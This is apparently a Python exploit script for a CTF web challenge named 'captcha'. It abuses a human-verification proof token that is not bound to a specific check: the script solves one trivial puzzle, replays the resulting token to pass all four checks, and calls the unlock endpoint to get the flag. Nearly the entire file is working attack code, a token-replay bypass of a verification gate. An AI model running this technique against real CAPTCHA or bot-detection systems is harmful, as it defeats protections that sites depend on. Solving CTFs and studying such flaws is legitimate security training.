#!/usr/bin/env python3
"""z0d1akCTF 2026 Qualifiers - Web - "captcha"  --  exploit

The gate requires completing four checks (file-sort, cable-rotate, sliding-tile,
race-lap) inside a 10-second, server-enforced attempt window, and each check has
a "minimum observation period" so results cannot be submitted implausibly fast.
The race lap's observation period equals its simulated duration (ticks / hz),
which is longer than the whole window - so it cannot be driven legitimately.

Vulnerability: verify() returns a proof that is a JWT scoped to the SESSION /
attempt (sub = session:attempt-..., aud = human-verification, human = true) and
carries NO check identifier. accept() honours any valid proof for the check named
in the URL, so a single proof minted from the trivial cable-box check completes
all four checks, race-lap included.

Flow:
  1. From `waiting`, POST /api/check/start x4 -> one attempt, one check each.
  2. Open a WebSocket per channel (verify/accept require it: CHANNEL_SCOPE).
  3. verify the cable-box puzzle once -> a human=true JWT.
  4. POST that one proof to /api/checks/<id>/accept for all four checks.
  5. POST /api/unlock -> flag.

Usage:  python3 win.py [host]
        host defaults to the instance used during solve; pass a fresh instancer
        hostname (no scheme), e.g. captcha-xxxx.chals.z0d1ak.org
"""
import json,time,threading,urllib.request,urllib.error,http.cookiejar,uuid,sys
import solvers
from ws import WS
HOST=sys.argv[1] if len(sys.argv)>1 else "captcha-266c2c39580f.chals.z0d1ak.org"
BASE="https://"+HOST
cj=http.cookiejar.CookieJar(); op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
T0=[time.time()]
def rel():return f"[+{time.time()-T0[0]:5.2f}s] "
def call(m,p,b=None,h=None):
    d=json.dumps(b).encode() if b is not None else None
    hd={'Content-Type':'application/json'} if b is not None else {}
    if h:hd.update(h)
    try:
        r=op.open(urllib.request.Request(BASE+p,data=d,headers=hd,method=m),timeout=15)
        return r.status,json.loads(r.read().decode() or 'null')
    except urllib.error.HTTPError as e:
        try:dd=json.loads(e.read().decode() or 'null')
        except:dd=None
        return e.code,dd
    except Exception as e: return 0,{'error':str(e)}
ck=lambda:"; ".join(f"{c.name}={c.value}" for c in cj)
def sv(ch,cfg):
    return {'desktop-cleanup':solvers.solve_desktop,'cable-box':solvers.solve_cable,'tile-scramble':solvers.solve_tile}[ch](cfg)

def run():
    # ensure waiting
    for _ in range(40):
        s,d=call('GET','/api/state')
        if d and d.get('status')=='waiting': break
        if d and d.get('status')=='running' and d.get('completed_checks',0)>0:
            call('POST','/api/session/restart',{})
        time.sleep(0.4)
    T0[0]=time.time()
    s,d=call('POST','/api/check/start',{'client_id':str(uuid.uuid4())})
    if s not in(200,201): print(rel()+'reg1',s,d); return
    checks=[d]; wss={}
    def openws(c):
        w=WS(HOST,f"/api/check/live?channel={c['channel_id']}",cookie=ck())
        try:w.connect(); wss[c['check_id']]=w
        except Exception as e:print(rel()+'wsfail',e)
    threading.Thread(target=openws,args=(d,)).start()
    slots=[None]*3
    def reg(i):
        s,x=call('POST','/api/check/start',{'client_id':str(uuid.uuid4())})
        if x and x.get('check_id'): slots[i]=x; threading.Thread(target=openws,args=(x,)).start()
    ts=[threading.Thread(target=reg,args=(i,)) for i in range(3)]
    [t.start() for t in ts]; [t.join() for t in ts]
    for x in slots:
        if x: checks.append(x)
    by={c['challenge']:c for c in checks}
    print(rel()+f"registered {len(checks)}: {list(by)}")
    delta=checks[0]['state']['server_now']-int(time.time()*1000); snow=lambda:int(time.time()*1000)+delta
    dl=checks[0]['deadline_at']
    for _ in range(120):
        if len(wss)>=len(checks): break
        time.sleep(0.02)
    while snow()<max(c['minimum_complete_at'] for c in checks)+40: time.sleep(0.02)
    print(rel()+f"setup done ws={len(wss)}, {(dl-snow())/1000:.1f}s left")
    # verify ONE trivial check to mint a human-JWT
    easy=by.get('cable-box') or by.get('tile-scramble') or by.get('desktop-cleanup')
    st,r=call('POST',f"/api/checks/{easy['check_id']}/verify",{'transcript':sv(easy['challenge'],easy['challenge_config'])},{'X-Check-Channel':easy['channel_id']})
    proof=r.get('proof') if isinstance(r,dict) else None
    print(rel()+f"minted proof via {easy['challenge']}: {st} {'ok' if proof else r}")
    if not proof: return
    # accept ALL checks with the one proof
    done=0
    for c in checks:
        st,r=call('POST',f"/api/checks/{c['check_id']}/accept",{'proof':proof},{'X-Check-Channel':c['channel_id']})
        cc=(r or {}).get('state',{}).get('completed_checks')
        if st==200: done=cc if cc is not None else done
        print(rel()+f"accept {c['challenge']:15s} {st} completed={cc} {(r or {}).get('code') or ''}")
    st,r=call('POST','/api/unlock',{})
    print(rel()+f"UNLOCK {st} {json.dumps(r)}")
    for w in wss.values(): w.close()
    return r

if __name__=='__main__':
    run()
